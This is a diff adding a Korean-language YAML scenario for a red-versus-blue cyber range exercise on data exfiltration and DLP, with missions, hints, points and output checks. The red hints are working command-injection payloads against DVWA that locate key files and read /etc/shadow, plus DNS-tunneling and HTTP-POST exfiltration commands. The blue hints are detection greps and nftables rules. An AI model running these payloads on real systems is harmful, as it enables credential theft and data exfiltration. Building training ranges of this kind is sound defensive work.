@@ -1,0 +1,116 @@
+id: "exfil-vs-dlp"
+title: "데이터 유출 vs DLP"
+description: "내부 첩보에 의하면 공격자가 민감 데이터를 외부로 유출하려는 시도를 계획하고 있다. Red Team은 대상 시스템에서 민감 정보를 탐색하고 인코딩, DNS 터널링 등 다양한 방법으로 데이터를 유출해야 한다. Blue Team은 아웃바운드 트래픽을 모니터링하고 비정상 데이터 전송을 탐지하여 차단해야 한다."
+difficulty: "medium"
+time_limit: 2700
+battle_type: "1v1"
+
+red_missions:
+  - order: 1
+    instruction: "DVWA의 Command Injection을 통해 대상 시스템에서 민감 파일 위치를 탐색하라."
+    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;find+/etc+-name+*.conf+-o+-name+*.key+-o+-name+*.pem+2>/dev/null|head+-20&Submit=Submit'"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: ".conf"
+
+  - order: 2
+    instruction: "Command Injection을 통해 /etc/shadow 파일 접근을 시도하라."
+    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;cat+/etc/shadow+2>&1|head+-5&Submit=Submit'"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "root"
+
+  - order: 3
+    instruction: "JuiceShop API에서 사용자 데이터를 추출하라."
+    hint: "curl -s http://10.20.30.80:3000/api/Users | python3 -m json.tool | head -30"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "data"
+
+  - order: 4
+    instruction: "추출한 데이터를 Base64로 인코딩하여 유출 준비를 하라."
+    hint: "echo 'sensitive_data:admin:password123' | base64"
+    points: 10
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "c2Vuc2l0aXZl"
+
+  - order: 5
+    instruction: "DNS 쿼리를 이용한 데이터 유출(DNS tunneling) 시뮬레이션을 수행하라."
+    hint: "echo 'exfil-test' | xxd -p | while read line; do nslookup $line.exfil.test 2>&1; done | head -10"
+    points: 20
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "exfil"
+
+  - order: 6
+    instruction: "HTTP를 이용한 데이터 유출을 시뮬레이션하라 (POST 요청에 인코딩된 데이터 포함)."
+    hint: "curl -s -X POST http://10.20.30.80:3000 -d \"data=$(echo 'stolen_credentials' | base64)\" -o /dev/null -w '%{http_code}'"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: ""
+
+blue_missions:
+  - order: 1
+    instruction: "suricata에서 비정상 DNS 쿼리 패턴을 탐지하라."
+    hint: "grep -i 'dns' /var/log/suricata/eve.json | tail -20"
+    points: 15
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: "dns"
+
+  - order: 2
+    instruction: "nftables에서 외부로 나가는 DNS 트래픽을 허용된 DNS 서버로만 제한하는 룰을 추가하라."
+    hint: "nft add rule inet filter output udp dport 53 ip daddr != 10.20.30.1 drop"
+    points: 20
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: ""
+
+  - order: 3
+    instruction: "suricata의 eve.json에서 대용량 HTTP POST 요청을 모니터링하라."
+    hint: "grep '\"http\"' /var/log/suricata/eve.json | grep -i 'POST' | tail -10"
+    points: 15
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: "http"
+
+  - order: 4
+    instruction: "Apache 접근 로그에서 비정상적인 데이터 전송 패턴(Base64 등)을 탐지하라."
+    hint: "grep -iE 'base64|data=|exfil' /var/log/apache2/access.log | tail -20"
+    points: 15
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "base64"
+
+  - order: 5
+    instruction: "Wazuh에서 데이터 유출 관련 알림을 확인하라."
+    hint: "grep -iE 'exfil\\|data_leak\\|sensitive' /var/ossec/logs/alerts/alerts.json | tail -20"
+    points: 10
+    target_vm: siem
+    verify:
+      type: "output_contains"
+      expect: "alert"
+
+  - order: 6
+    instruction: "nftables에 아웃바운드 트래픽에 대한 rate limiting을 적용하여 대량 데이터 전송을 제한하라."
+    hint: "nft add rule inet filter output tcp dport { 80, 443 } ct state new limit rate 30/minute accept"
+    points: 15
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: ""
